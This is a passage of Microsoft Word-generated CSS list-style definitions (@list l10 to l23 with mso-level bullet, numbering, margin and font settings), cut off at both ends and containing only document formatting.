mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l10:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l10:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l10:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l10:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l10:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l10:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l11:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l11:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l11:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l11:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l11:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l11:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l11:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l11:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l11:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l12:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:29.5500pt;text-indent:-21.6000pt;font-family:'Courier New';letter-spacing:-0.0500pt;font-size:12.0000pt;}

@list l12:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:102.0000pt;text-indent:-21.6000pt;font-family:'Times New Roman';}

@list l12:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:144.4000pt;text-indent:-21.6000pt;font-family:'Times New Roman';}

@list l12:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:186.8500pt;text-indent:-21.6000pt;font-family:'Times New Roman';}

@list l12:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:229.3000pt;text-indent:-21.6000pt;font-family:'Times New Roman';}

@list l12:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:271.7500pt;text-indent:-21.6000pt;font-family:'Times New Roman';}

@list l12:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:314.2000pt;text-indent:-21.6000pt;font-family:'Times New Roman';}

@list l12:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:356.6500pt;text-indent:-21.6000pt;font-family:'Times New Roman';}

@list l12:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:399.1000pt;text-indent:-21.6000pt;font-family:'Times New Roman';}

@list l13:level1{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\3E;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:8.0000pt;text-indent:-14.4000pt;font-family:'Courier New';font-size:12.0000pt;}

@list l13:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:55.6000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l13:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:103.2000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l13:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:150.8000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l13:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:198.4000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l13:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:246.0000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l13:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:293.6000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l13:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:341.2000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l13:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:388.8000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l14:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;}

@list l14:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l14:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l14:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l14:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l14:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l14:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l14:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l14:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l15:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;}

@list l15:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l15:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l15:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l15:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l15:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l15:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l15:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l15:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l16:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l16:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l16:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l16:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l16:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l16:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l16:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l16:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l16:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l17:level1{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\3E;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:8.0000pt;text-indent:-14.4000pt;font-family:'Courier New';font-size:12.0000pt;}

@list l17:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:55.6000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l17:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:103.2000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l17:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:150.8000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l17:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:198.4000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l17:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:246.0000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l17:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:293.6000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l17:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:341.2000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l17:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:388.8000pt;text-indent:-14.4000pt;font-family:'Times New Roman';}

@list l18:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l18:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l18:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l18:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l18:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l18:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l18:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l18:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l18:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l19:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l19:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l19:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l19:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l19:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l19:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l19:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l19:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l19:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l20:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l20:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l20:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l20:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l20:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l20:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l20:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l20:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l20:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l21:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l21:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l21:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l21:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l21:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l21:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l21:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l21:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l21:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l22:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;}

@list l22:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l22:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l22:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l22:level5{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:212.2000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l22:level6{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:257.5000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l22:level7{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:302.8000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l22:level8{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:348.1000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l22:level9{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:393.4000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l23:level1{
mso-level-number-format:decimal;
mso-level-suffix:tab;
mso-level-text:"%1.";
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:30.5000pt;text-indent:-18.7500pt;font-family:Georgia;letter-spacing:-3.6000pt;font-size:15.0000pt;}

@list l23:level2{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:76.3000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l23:level3{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:121.6000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l23:level4{
mso-level-start-at:0;
mso-level-number-format:bullet;
mso-level-suffix:tab;
mso-level-text:\2022;
mso-level-tab-stop:none;
mso-level-number-position:left;
margin-left:166.9000pt;text-indent:-18.7500pt;font-family:'Times New Roman';}

@list l23:level5{
mso-level-start-at:0;
